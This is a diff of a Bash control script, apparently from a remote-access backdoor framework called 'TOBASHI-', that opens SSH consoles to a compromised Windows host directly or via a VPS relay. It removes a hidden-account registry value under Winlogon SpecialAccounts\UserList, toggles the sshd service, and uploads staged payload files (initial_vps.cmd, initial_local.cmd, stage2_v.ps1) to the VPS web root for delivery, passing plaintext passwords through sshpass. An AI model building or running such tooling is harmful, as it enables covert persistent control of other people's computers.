@@ -201,14 +201,14 @@ console_menu(){
 
         read -p "Tape Enter to go to the LOCAL console..." enter
 
-        sshpass -p "$password" ssh -t "$username@$ip" # le -t permet d'initier la connexion et de sortir que si on met exit
+        ssh -t "$username@$ip" # le -t permet d'initier la connexion et de sortir que si on met exit
         read -p "Tape Enter to exit the console..." dummy
 
     elif [ "$connection_type" = "remote" ]; then
 
         read -p "Tape Enter to go to the REMOTE console..." enter
 
-        sshpass -p "$password" ssh -t "$username@$ip_remote_vps" -p "$remote_port"
+        sshpass -p "$password" ssh -tt "$username@$ip_remote_vps" -p "$remote_port"
 
         read -p "Tape Enter to exit the console..." dummy
     else
@@ -239,7 +239,7 @@ kill_menu(){ #TODO : delete the Guest registery key
         if [ "$connection_type" = "local" ]; then
 
             registryPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
-            valueName="Guest"
+            valueName="$username"
 
             sshpass -p "$password" ssh "$username@$ip" 'powershell -Command "Set-Service -Name sshd -StartupType 'Manual' " '
             sshpass -p "$password" ssh "$username@$ip" "powershell -Command \"Remove-ItemProperty -Path '$registryPath' -Name '$valueName'\""
@@ -249,7 +249,7 @@ kill_menu(){ #TODO : delete the Guest registery key
         elif [ "$connection_type" = "remote" ]; then
 
             registryPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
-            valueName="Guest"
+            valueName="$username"
             
             sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" 'powershell -Command "Set-Service -Name sshd -StartupType 'Manual' " '
             sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" "powershell -Command \"Remove-ItemProperty -Path '$registryPath' -Name '$valueName'\""
@@ -410,6 +410,8 @@ vps_menu(){
     # Commande pour remplacer le fichier stage2_v.ps1 dans TOBASHI-/files/
     sshpass -p "$password_vps" scp ./files/stage2_v.ps1 "$username_vps@$ip_vps":/var/www/html/TOBASHI-/files/stage2_v.ps1
     
+    
+    
 
     clear
     echo -e "${gras} ${red}"
@@ -467,11 +469,21 @@ vps_menu(){
     echo "$username_vps" >> ./vps_settings/vps_conf.txt
     echo "$password_vps" >> ./vps_settings/vps_conf.txt
 
+    # copy the payload 
+    cp ./src/initial_vps.cmd ./payloads_generated/initial_vps.cmd
+
+    # Commande pour remplacer le fichier initial_vps et initial_local.cmd dans TOBASHI-/payload_generated/
+    
+    sshpass -p "$password_vps" scp ./payloads_generated/initial_vps.cmd "$username_vps@$ip_vps":/var/www/html/TOBASHI-/payloads_generated/initial_vps.cmd
+    sshpass -p "$password_vps" scp ./payloads_generated/initial_local.cmd "$username_vps@$ip_vps":/var/www/html/TOBASHI-/payloads_generated/initial_local.cmd
+    
+    echo "[+] Copying payloads to VPS..."
+    sleep 2
+
     echo "[+] Restarting VPS...."
 
     sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'reboot'
 
-    cp ./src/initial_vps.cmd ./payloads_generated/initial_vps.cmd
     sed -i '2s/.*/1/' ./bin/state_machine.txt
 
 
